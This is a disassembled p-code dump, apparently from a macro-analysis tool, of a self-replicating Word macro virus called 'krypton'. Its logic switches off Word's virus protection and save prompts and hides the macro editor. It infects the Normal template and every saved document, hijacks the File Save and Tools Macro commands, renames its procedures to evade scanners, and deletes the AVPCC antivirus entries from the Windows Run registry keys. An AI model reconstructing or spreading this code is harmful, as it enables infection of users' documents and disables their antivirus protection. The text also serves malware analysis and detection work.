' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0037 "163,9571   66,07912    8,951941    76,12047    16,61564"
' Line #236:
' 	QuoteRem 0x0000 0x0037 "155.1797   65.39644    44.92301    27.13999    46.47184"
' Line #237:
' 	QuoteRem 0x0000 0x0033 "350.3782   27.91799    66.89333    176.529 20.60163"
' Line #238:
' 	QuoteRem 0x0000 0x0037 "184.6814   37.85266    62.08024    131.5903    6.205057"
' Line #239:
' 	QuoteRem 0x0000 0x0037 "274.4437   29.69988    145.8309    80.11719    15.62759"
' Line #240:
' 	QuoteRem 0x0000 0x0033 "209.5493   14.70623    41.1346 44.18858    41.31762"
' Line #241:
' 	QuoteRem 0x0000 0x0037 "363.4363   29.87785    42.04824    169.5462    14.73613"
' Line #242:
' 	QuoteRem 0x0000 0x0037 "329.082    71.70483    38.84999    7.887883    39.53069"
' Line #243:
' 	QuoteRem 0x0000 0x0036 "435.7095   29.89048    153.1638    71.76006    21.3161"
' Line #244:
' 	QuoteRem 0x0000 0x0037 "196.4927   44.89401    80.20324    114.1727    27.57722"
' Line #245:
' 	QuoteRem 0x0000 0x0037 "105.5832   43.79846    91.06363    141.7999    35.20638"
' Line #246:
' 	QuoteRem 0x0000 0x0032 "388.5746   48.1562 13.14965    163.2252    15.8997"
' Line #247:
' 	QuoteRem 0x0000 0x0037 "152.1205   56.29233    133.8543    72.46186    36.64165"
' Line #248:
' 	QuoteRem 0x0000 0x0033 "350.4249   77.31232    44.0137 106.9814    4.320534"
' Line #249:
' 	QuoteRem 0x0000 0x0037 "313.6666   26.01284    5.941448    41.53357    4.842751"
' Line #250:
' 	QuoteRem 0x0000 0x0037 "380.0715   43.28584    138.5046    .7039404    46.09143"
' Line #251:
' Macros/VBA/krypton - 19254 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Label krypton 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #11:
' 	Ld ActiveDocument 
' 	ArgsMemCall Reload 0x0000 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTinf 
' 	EndIf 
' Line #14:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ATinf 
' 	EndIf 
' Line #15:
' 	Ld NTinf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ATinf 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #18:
' 	Ld NTinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set JI 
' Line #20:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #21:
' 	LitDI2 0x007B 
' 	LitStr 0x000E "Sub AutoExec()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #22:
' 	LitDI2 0x008A 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #23:
' 	LitDI2 0x0098 
' 	LitStr 0x000E "Sub FileSave()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #24:
' 	LitDI2 0x00A0 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #25:
' 	LitDI2 0x00A8 
' 	LitStr 0x0010 "Sub ViewVBcode()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #26:
' 	LitDI2 0x00AA 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #27:
' 	LitDI2 0x00AC 
' 	LitStr 0x000E "Sub AutoExit()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #28:
' 	LitDI2 0x00B0 
' 	LitStr 0x0012 "Sub ToolsOptions()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #29:
' 	LitDI2 0x00B6 
' 	LitStr 0x000E "Sub Mutation()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #30:
' 	LitDI2 0x00C1 
' 	LitStr 0x0009 "Sub xxx()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #31:
' 	LitDI2 0x00CC 
' 	LitStr 0x000D "Sub Antigen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #32:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St CI 
' Line #33:
' 	EndWith 
' Line #34:
' 	StartWithExpr 
' 	Ld JI 
' 	With 
' Line #35:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld CI 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #37:
' 	EndWith 
' Line #38:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	LitDI2 0x007B 
' 	LitStr 0x0011 "Private Sub aaa()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #40:
' 	LitDI2 0x008A 
' 	LitStr 0x0011 "Private Sub bbb()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #41:
' 	LitDI2 0x0098 
' 	LitStr 0x0011 "Private Sub ccc()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #42:
' 	LitDI2 0x00A0 
' 	LitStr 0x0011 "Private Sub ddd()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #43:
' 	LitDI2 0x00A8 
' 	LitStr 0x0011 "Private Sub eee()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #44:
' 	LitDI2 0x00AA 
' 	LitStr 0x0011 "Private Sub fff()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #45:
' 	LitDI2 0x00AC 
' 	LitStr 0x0011 "Private Sub ggg()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #46:
' 	LitDI2 0x00B0 
' 	LitStr 0x0011 "Private Sub hhh()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	LitDI2 0x00B6 
' 	LitStr 0x0011 "Private Sub iii()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #48:
' 	LitDI2 0x00C1 
' 	LitStr 0x0011 "Private Sub kkk()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	LitDI2 0x00CC 
' 	LitStr 0x0011 "Private Sub lll()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #50:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St CI 
' Line #51:
' 	EndWith 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	Ld Document 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set HI 
' Line #55:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #56:
' 	LitDI2 0x007B 
' 	LitStr 0x0011 "Private Sub aaa()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #57:
' 	LitDI2 0x008A 
' 	LitStr 0x0011 "Private Sub bbb()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #58:
' 	LitDI2 0x0098 
' 	LitStr 0x0011 "Private Sub ccc()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #59:
' 	LitDI2 0x00A0 
' 	LitStr 0x0011 "Private Sub ddd()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #60:
' 	LitDI2 0x00A8 
' 	LitStr 0x0011 "Private Sub eee()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #61:
' 	LitDI2 0x00AA 
' 	LitStr 0x0011 "Private Sub fff()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #62:
' 	LitDI2 0x00AC 
' 	LitStr 0x0011 "Private Sub ggg()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #63:
' 	LitDI2 0x00B0 
' 	LitStr 0x0011 "Private Sub hhh()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #64:
' 	LitDI2 0x00B6 
' 	LitStr 0x0011 "Private Sub iii()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #65:
' 	LitDI2 0x00C1 
' 	LitStr 0x0011 "Private Sub kkk()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #66:
' 	LitDI2 0x00CC 
' 	LitStr 0x0011 "Private Sub lll()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #67:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St CI 
' Line #68:
' 	EndWith 
' Line #69:
' 	StartWithExpr 
' 	Ld HI 
' 	With 
' Line #70:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #71:
' 	LitDI2 0x0001 
' 	Ld CI 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #72:
' 	EndWith 
' Line #73:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #74:
' 	LitDI2 0x007B 
' 	LitStr 0x000E "Sub AutoExec()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #75:
' 	LitDI2 0x008A 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #76:
' 	LitDI2 0x0098 
' 	LitStr 0x000E "Sub FileSave()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #77:
' 	LitDI2 0x00A0 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #78:
' 	LitDI2 0x00A8 
' 	LitStr 0x0010 "Sub ViewVBcode()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #79:
' 	LitDI2 0x00AA 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #80:
' 	LitDI2 0x00AC 
' 	LitStr 0x000E "Sub AutoExit()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #81:
' 	LitDI2 0x00B0 
' 	LitStr 0x0012 "Sub ToolsOptions()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #82:
' 	LitDI2 0x00B6 
' 	LitStr 0x000E "Sub Mutation()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #83:
' 	LitDI2 0x00C1 
' 	LitStr 0x0009 "Sub xxx()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #84:
' 	LitDI2 0x00CC 
' 	LitStr 0x000D "Sub Antigen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #85:
' 	EndWith 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #88:
' 	EndSub 
' Line #89:
' 	FuncDefn (Private Sub Document_Close())
' Line #90:
' 	OnError (Resume Next) 
' Line #91:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #93:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	Else 
' 	BoSImplicit 
' 	GoTo 2 
' 	EndIf 
' Line #94:
' 	LineNum 1 
' 	BoS 0x0003 
' 	ArgsCall (Call) Document_Open 0x0000 
' Line #95:
' 	LineNum 2 
' 	BoS 0x0003 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Private Sub Document_New())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' Line #98:
' 	Dim 
' 	VarDefn H
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St H 
' Line #99:
' 	Ld H 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #100:
' 	Ld H 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #101:
' 	LineNum 1 
' 	BoS 0x0003 
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #102:
' 	LitDI2 0x00C1 
' 	LitStr 0x000E "Sub FileOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' Line #103:
' 	Dim 
' 	VarDefn V
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St V 
' 	BoS 0x0000 
' 	Ld V 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #104:
' 	LitStr 0x000B "krypton.bas"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0007 "krypton"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #107:
' 	LitStr 0x000B "krypton.bas"
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #108:
' 	LitStr 0x000B "krypton.bas"
' 	ArgsCall Kill 0x0001 
' Line #109:
' 	SetStmt 
' 	LitStr 0x0007 "krypton"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ND 
' Line #110:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #111:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VC 
' Line #112:
' 	EndWith 
' Line #113:
' 	StartWithExpr 
' 	Ld ND 
' 	With 
' Line #114:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #115:
' 	LitDI2 0x0001 
' 	Ld VC 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #116:
' 	EndWith 
' Line #117:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set SS 
' Line #118:
' 	StartWithExpr 
' 	Ld SS 
' 	With 
' Line #119:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #120:
' 	EndWith 
' Line #121:
' 	EndSub 
' Line #122:
' 	FuncDefn (Sub AutoExec())
' Line #123:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #124:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #125:
' 	OnError 1 
' Line #126:
' 	StartWithExpr 
' 	LitStr 0x0007 "krypton"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #127:
' 	LitDI2 0x00C1 
' 	LitStr 0x0009 "Sub xxx()"
' 	ArgsMemCallWith replaceline 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn R
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St R 
' 	BoS 0x0000 
' 	Ld R 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #128:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ND 
' Line #129:
' 	StartWithExpr 
' 	LitStr 0x0007 "krypton"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #130:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VC 
' 	BoS 0x0000 
' 	EndWith 
' Line #131:
' 	StartWithExpr 
' 	Ld ND 
' 	With 
' Line #132:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #133:
' 	LitDI2 0x0001 
' 	Ld VC 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #134:
' 	EndWith 
' Line #135:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	LitStr 0x0007 "krypton"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #136:
' 	LineNum 1 
' 	BoS 0x0003 
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub AutoOpen())
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #140:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #141:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #142:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #143:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #144:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #145:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #146:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #147:
' 	Dim 
' 	VarDefn S
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St S 
' 	BoS 0x0000 
' 	Ld S 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #148:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #149:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub FileSave())
' Line #152:
' 	OnError (Resume Next) 
' Line #153:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #154:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #155:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #156:
' 	Dim 
' 	VarDefn P
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St P 
' 	BoS 0x0000 
' 	Ld P 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #157:
' 	LineNum 1 
' 	BoS 0x0003 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Sub FileSaveAs())
' Line #160:
' 	OnError (Resume Next) 
' Line #161:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #162:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo 1 
' 	EndIf 
' Line #163:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "krypton"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #164:
' 	Dim 
' 	VarDefn T
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St T 
' 	BoS 0x0000 
' 	Ld T 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #165:
' 	LineNum 1 
' 	BoS 0x0003 
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub ViewVBcode())
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub ToolsMacro())
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub AutoExit())
' Line #172:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #173:
' 	Dim 
' 	VarDefn W
' 	BoS 0x0000 
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St W 
' 	BoS 0x0000 
' 	Ld W 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Mutation 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall (Call) Antigen 0x0000 
' 	EndIf 
' Line #174:
' 	EndSub 
' Line #175:
' 	FuncDefn (Sub ToolsOptions())
' Line #176:
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #177:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	IfBlock 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #180:
' 	EndSub 
' Line #181:
' 	FuncDefn (Sub Mutation())
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
' 	LitStr 0x0005 "AVPCC"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #184:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0048 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices"
' 	LitStr 0x000D "AVPCC Service"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #185:
